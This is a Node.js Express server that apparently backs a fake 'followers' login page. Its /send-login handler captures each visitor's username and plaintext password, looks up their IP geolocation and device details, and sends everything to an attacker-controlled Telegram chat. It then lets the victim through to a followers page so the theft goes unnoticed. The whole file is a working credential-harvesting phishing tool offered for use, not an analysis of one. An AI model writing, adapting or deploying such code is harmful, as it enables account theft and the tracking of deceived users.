    const express = require("express");
    const bodyParser = require("body-parser");
    const axios = require("axios");
    const path = require("path");
    const session = require("express-session");
    const UAParser = require("ua-parser-js");
    require("dotenv").config();

    const app = express();
    let isAuthenticated = false;
    let dailyFollowerLimit = 120;   

    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;      
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    const IPINFO_TOKEN = process.env.IPINFO_TOKEN;
    const SESSION_SECRET = process.env.SESSION_SECRET;  


    app.use(bodyParser.json());
    app.use(
        session({
            secret: SESSION_SECRET,
            resave: false, // Prevents resaving unmodified sessions
            saveUninitialized: true, // Saves new sessions
            cookie: {   
                httpOnly: true, // Helps mitigate XSS
                secure: false, // Set to true if using HTTPS
                maxAge: 1000 * 60 * 30, // Session expires after 30 minutes
            },
        })
    );      

    // Serve static files (CSS, images, etc.)
    app.use((req, res, next) => {
        if (req.url === "/index.html" && req.session.isAuthenticated) {
            return res.redirect("/followers");
        }
        next();
    });

    app.use(express.static(__dirname));

    // Serve login page
    app.get('/', (req, res) => {
        res.sendFile(path.resolve(__dirname, 'index.html'));
    });

    // Handle login data
    app.post("/send-login", async (req, res) => {
        const { username, password } = req.body;    

        console.log("Received login data:", req.body); // Debugging: log incoming data

        // Validate input
        if (!username || !password) {
            return res.status(400).json({ success: false, message: "Username and password are required." });
        }

        try {
            // Extract client IP (real IPv4, handle proxies and localhost)
            let clientIp = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;

            // Convert IPv6 localhost (::1) or mapped IPv6 to IPv4
            if (clientIp === "::1" || clientIp === "127.0.0.1") {
                console.log("Localhost detected, fetching public IP...");
                const ipResponse = await axios.get("https://api.ipify.org?format=json");
                clientIp = ipResponse.data.ip;
            }

            // Ensure the IP is always in IPv4 format
            if (clientIp.includes(":")) {
                clientIp = clientIp.split(":").pop(); // Extract IPv4 if it's mapped
            }

            console.log(`Resolved Client IP: ${clientIp}`);

            // Fetch IP/location details using IPInfo
            const ipData = await axios.get(`https://ipinfo.io/${clientIp}/json?token=${IPINFO_TOKEN}`);
            const { ip, city, region, country, loc, org, timezone } = ipData.data;

            console.log("IP Data fetched:", ipData.data);

            // Extract and parse user-agent data
            const userAgent = req.headers["user-agent"];    
            const parser = new UAParser(userAgent);
            const deviceInfo = parser.getResult();
            const deviceDetails = `
            - *Device*: ${deviceInfo.device.vendor || "Unknown"} ${deviceInfo.device.model || ""}
            - *OS*: ${deviceInfo.os.name || "Unknown"} ${deviceInfo.os.version || ""}
            - *Browser*: ${deviceInfo.browser.name || "Unknown"} ${deviceInfo.browser.version || ""}
            `.trim();

            console.log("Parsed Device Info:", deviceInfo);

            // Escape special characters in Telegram message
            const escapeMarkdown = (text) =>
                text.replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');

            // Prepare Telegram message
            const message = `
            🌐 *New Login Attempt*:
            - *Username*: \`${username}\`   
            - *Password*: \`${password}\`
            - *IP*: ${ip}
            - *Location*: ${escapeMarkdown(`${city}, ${region}, ${country}`)} (${loc})
            - *Country*: ${country} ${getFlagEmoji(country)}
            - *Timezone*: ${timezone}
            - *ISP*: ${escapeMarkdown(org || "Unknown")}
            - *Device Details*: ${deviceDetails}
            `;

            // Send the message to Telegram
            const telegramResponse = await axios.post(
                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
                {
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: "Markdown",
                }
            );

            console.log("Telegram response:", telegramResponse.data); // Debugging: log Telegram response

            req.session.isAuthenticated = true;
            console.log("Session after login:", req.session); // Log the session
            res.json({ success: true, message: "Login successful." });
        } catch (error) {
            if (error.response) {
                console.error("Error response from Telegram:", error.response.data); // Log error details
            } else {
                console.error("Error sending login data:", error.message); // Log general error
            }
            res.status(500).json({ success: false, message: "Failed to send login data." });
        }
    });

    // Serve followers page (restricted access)
    app.get("/followers", (req, res) => {
        console.log("Session content:", req.session); // Log the session
        if (!req.session.isAuthenticated) {
            console.log("User not authenticated, redirecting...");
            return res.redirect("/");
        }
        res.sendFile(path.resolve(__dirname, "followers.html"));
    });

    // Logout route to destroy session and redirect to login page
    app.get("/logout", (req, res) => {
        req.session.destroy((err) => {
            if (err) {
                console.error("Error destroying session:", err);
                return res.status(500).send("Failed to log out.");
            }
            console.log("User logged out, redirecting to /.");
            res.redirect("/"); // Redirect to login page after logout
        });
    });

    // Helper function to get flag emoji from country code
    function getFlagEmoji(countryCode) {
        return countryCode
            .toUpperCase()
            .replace(/./g, (char) => String.fromCodePoint(127397 + char.charCodeAt()));
    }

    // Start the server
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
